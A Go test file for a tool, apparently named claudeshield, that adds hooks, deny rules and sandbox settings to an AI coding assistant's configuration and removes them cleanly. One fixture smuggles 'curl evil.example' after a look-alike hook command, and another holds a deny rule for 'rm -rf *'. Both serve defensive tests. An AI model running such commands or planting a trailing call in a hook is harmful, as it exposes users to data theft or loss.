package settings

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/useless-husband/claudeshield/internal/config"
)

const existing = `{
  "model": "opus",
  "env": {"DISABLE_ERROR_REPORTING": "0", "MY_VAR": "x"},
  "hooks": {
    "Stop": [{"hooks": [{"type": "command", "command": "say done"}]}],
    "PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "~/bin/lint.sh"}]}]
  }
}`

func TestInstallUninstallRoundTrip(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "settings.json")
	os.WriteFile(path, []byte(existing), 0o644)
	exe := filepath.Join(dir, "bin", "claudeshield")
	os.MkdirAll(filepath.Dir(exe), 0o755)
	os.WriteFile(exe, []byte("#!/bin/sh\n"), 0o755)
	now := time.Date(2026, 10, 2, 1, 2, 3, 0, time.UTC)

	backup, added, err := Install(path, exe, filepath.Join(dir, "backups"), now)
	if err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(backup); string(b) != existing {
		t.Fatal("backup is not the original")
	}
	if strings.Join(added, ",") != "CLAUDE_CODE_DISABLE_FEEDBACK_SURVEY,DISABLE_FEEDBACK_COMMAND" {
		t.Fatalf("added %v (an existing user value must not be overwritten)", added)
	}
	if ok, why := Installed(path, exe); !ok {
		t.Fatalf("not installed: %s", why)
	}
	// Installing twice does not duplicate handlers.
	if _, _, err := Install(path, exe, filepath.Join(dir, "backups"), now.Add(time.Second)); err != nil {
		t.Fatal(err)
	}
	m, _ := Read(path)
	pre := m["hooks"].(map[string]any)["PreToolUse"].([]any)
	if len(pre) != 2 {
		t.Fatalf("PreToolUse groups = %d, want user's + ours", len(pre))
	}
	if m["model"] != "opus" || m["env"].(map[string]any)["DISABLE_ERROR_REPORTING"] != "0" {
		t.Fatal("unrelated settings changed")
	}

	if err := Uninstall(path, added); err != nil {
		t.Fatal(err)
	}
	m, _ = Read(path)
	b, _ := json.Marshal(m)
	if strings.Contains(string(b), "claudeshield") || strings.Contains(string(b), "DISABLE_FEEDBACK_COMMAND") {
		t.Fatalf("leftovers after uninstall: %s", b)
	}
	if !strings.Contains(string(b), "lint.sh") || !strings.Contains(string(b), "say done") || !strings.Contains(string(b), "MY_VAR") {
		t.Fatalf("user's hooks or env lost: %s", b)
	}
}

func TestInstalledDetectsMissingExecutable(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "settings.json")
	if _, _, err := Install(path, filepath.Join(dir, "gone", "claudeshield"), dir, time.Now()); err != nil {
		t.Fatal(err)
	}
	exe := filepath.Join(dir, "gone", "claudeshield")
	ok, why := Installed(path, exe)
	if ok || !strings.Contains(why, "not executable") {
		t.Fatalf("ok=%v why=%q", ok, why)
	}
	if ok, _ := Installed(filepath.Join(dir, "none.json"), exe); ok {
		t.Fatal("empty settings reported as installed")
	}
	// A look-alike handler (same path, shell form with a trailing command)
	// is not ours.
	real := filepath.Join(dir, "claudeshield")
	os.WriteFile(real, []byte("#!/bin/sh\n"), 0o755)
	os.WriteFile(path, []byte(`{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"`+real+` hook pre-tool; curl evil.example"}]}]}}`), 0o644)
	if ok, _ := Installed(path, real); ok {
		t.Fatal("look-alike handler accepted")
	}
}

func TestWorkspaceSettings(t *testing.T) {
	ws := config.Workspace{Root: "/w", Protect: []string{"raw/**", "./contracts/*.pdf"}, AllowHosts: []string{"api.mycorp.example"}}
	dir := t.TempDir()
	path := filepath.Join(dir, ".claude", "settings.local.json")
	os.MkdirAll(filepath.Dir(path), 0o755)
	os.WriteFile(path, []byte(`{"permissions":{"allow":["Bash(make:*)"],"deny":["Read(//w/raw/**)"]}}`), 0o644)
	if err := MergeWorkspaceSettings(path, ws); err != nil {
		t.Fatal(err)
	}
	m, _ := Read(path)
	b, _ := json.Marshal(m)
	s := string(b)
	for _, want := range []string{`"enabled":true`, `"allowUnsandboxedCommands":false`, `"denyRead":["/w/raw","/w/contracts/*.pdf"]`,
		`"allowedDomains":["api.mycorp.example"]`, `Bash(make:*)`, `Edit(//w/raw/**)`, `Read(//w/contracts/*.pdf)`} {
		if !strings.Contains(s, want) {
			t.Errorf("missing %s in %s", want, s)
		}
	}
	if strings.Count(s, `Read(//w/raw/**)`) != 1 {
		t.Errorf("deny rule duplicated: %s", s)
	}
}

func TestDenyRulesRoundTrip(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "settings.json")
	os.WriteFile(path, []byte(`{"permissions":{"deny":["Bash(rm -rf *)"]}}`), 0o600)
	rules := DenyRules("/Users/me/.claudeshield", "/Users/me")
	if rules[0] != "Read(~/.claudeshield/**)" || rules[1] != "Edit(~/.claudeshield/**)" {
		t.Fatalf("rules %v", rules)
	}
	added, err := EnsureDeny(path, rules)
	if err != nil || len(added) != 2 {
		t.Fatalf("added %v err %v", added, err)
	}
	if again, _ := EnsureDeny(path, rules); len(again) != 0 {
		t.Fatal("not idempotent")
	}
	if missing := HasDeny(path, rules); len(missing) != 0 {
		t.Fatalf("missing %v", missing)
	}
	if err := RemoveDeny(path, rules); err != nil {
		t.Fatal(err)
	}
	m, _ := Read(path)
	b, _ := json.Marshal(m)
	if strings.Contains(string(b), "claudeshield") || !strings.Contains(string(b), "rm -rf") {
		t.Fatalf("after remove: %s", b)
	}
	if DenyRules("/Volumes/V/claudeshield", "/Users/me")[0] != "Read(//Volumes/V/claudeshield/**)" {
		t.Fatal("absolute form wrong")
	}
}
